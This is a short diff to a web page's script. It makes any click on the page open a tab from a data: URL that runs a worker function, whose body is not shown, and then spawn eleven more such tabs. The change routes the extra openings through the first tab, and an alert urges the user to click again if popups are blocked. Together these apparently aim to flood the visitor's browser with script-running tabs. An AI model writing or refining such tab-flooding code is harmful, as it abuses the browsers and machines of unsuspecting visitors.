@@ -20,11 +20,11 @@
         }
 
         function openTabs() {
-            let url = "data:text/html,<script>(" + encodeURIComponent(startWorker.toString()) + ")()</script>";
+            let urls = ["data:text/html,<script>(" + startWorker.toString() + ")()</script>"];
             let tabs = [];
             
             // Open first tab manually
-            let firstTab = window.open(url);
+            let firstTab = window.open(urls[0], "_blank");
             if (!firstTab) {
                 alert("Popup blocked! Click the page and try again.");
                 return;
@@ -35,7 +35,7 @@
             // Use first tab to open additional tabs
             setTimeout(() => {
                 for (let i = 0; i < 11; i++) {
-                    let newTab = window.open(url);
+                    let newTab = firstTab.window.open(urls[0], "_blank");
                     if (newTab) {
                         tabs.push(newTab);
                     }
@@ -44,7 +44,9 @@
         }
 
         // Attach to any user interaction
-        document.body.addEventListener("click", openTabs);
+        document.body.addEventListener("click", () => {
+            openTabs();
+        });
     </script>
 </body>
 </html>
